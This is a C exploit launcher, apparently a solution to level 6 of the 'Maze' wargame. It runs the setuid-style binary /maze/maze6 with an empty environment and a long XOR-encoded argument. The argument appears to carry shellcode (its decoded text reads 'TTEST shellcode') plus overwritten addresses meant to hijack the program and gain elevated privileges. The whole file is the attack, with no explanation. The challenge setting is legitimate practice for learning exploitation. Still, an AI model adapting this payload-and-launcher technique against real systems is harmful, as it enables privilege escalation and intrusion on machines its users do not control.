#define _GNU_SOURCE
#include <string.h>
#include <unistd.h>

int main(void) {
	char *environment[1] = {0};
	char *payload = "\xb2\xf1\xd5\xd5\x7e\x7e\x6f\x79\x7e\x2a\x79\x62\x6f\x66\x66\x69\x65\x6e\x6f\x17\x1b\xea\x1b\xf1\x1b\xe3\x1b\xf8\xa3\xcf\x1b\xea\x7a\x42\x05\x05\x59\x42\x42\x05\x48\x43\x44\xa7\x26\x0e\x1b\xea\x7a\x7b\xa1\x36\x0e\xa3\xcb\x9a\x21\xe7\xaa\x4b\x4b\x4b\x4b\x48\x4b\x4b\x4b\x49\x4b\x4b\x4b\x4e\x4b\x4b\x4b\x4f\x4b\x4b\x4b\x4c\x4b\x4b\x4b\x4d\x4b\x4b\x4b\x42\x4b\x4b\x4b\x43\x4b\x4b\x4b\x40\x4b\x4b\x4b\x41\x4b\x4b\x4b\x46\x4b\x4b\x4b\x47\x4b\x4b\x4b\x44\x4b\x4b\x4b\x45\x4b\x4b\x4b\x5a\x4b\x4b\x4b\x5b\x4b\x4b\x4b\x58\x4b\x4b\x4b\x59\x4b\x4b\x4b\x5e\x4b\x4b\x4b\x5f\x4b\x4b\x4b\x5c\x4b\x4b\x4b\x5d\x4b\x4b\x4b\x52\x4b\x4b\x4b\x53\x4b\x4b\x4b\x50\x4b\x4b\x48\x48\x4b\x4b\x48\x49\x4b\x4b\x48\x4e\x4b\x4b\x48\x4f\x4b\x4b\x48\x4c\x4b\x4b\x48\x4d\x4b\x4b\x48\x42\x4b\x4b\x48\x43\x4b\x4b\x48\x40\x4b\x4b\x48\x41\x4b\x4b\x48\x46\x4b\x4b\x48\x47\x4b\x4b\x48\x44\x4b\x4b\x48\x45\x4b\x4b\x48\x5a\x4b\x4b\x48\x5b\x4b\x4b\x48\x58\x4b\x4b\x48\x59\x4b\x4b\x48\x5e\x4b\x4b\x48\x5f\x4b\x4b\x48\x5c\x4b\x4b\x48\x5d\x4b\x4b\x48\x52\x4b\x4b\x48\x53\x9f\xf6\xd5\xd5\x4b\x4b\x4b\x4b\x48\x4b\x4b\x4b\x49\x4b\x4b\x4b\x8e\xf6\xd5\xd5\x41\x41\x41\x41\x41\x41\x41\x41\x41\x48\x5f\x59\x5e\x4f\x4e\x2a\x8b\xf6\xd5\xd5\x6c\x6b\x61\x6f\x6c\x63\x66\x6f\x17\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xf3\xb2\x2e\x22\xca\xb2\x2e\x22\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x6a\x56\xd3\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x8a\x2e\x22\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x4a\x13\xd6\xdd\x5e\x58\x4b\x59";
	char *argv[4] = {"/maze/maze6", "public", payload, 0};
	execve("/maze/maze6", argv, environment);
}
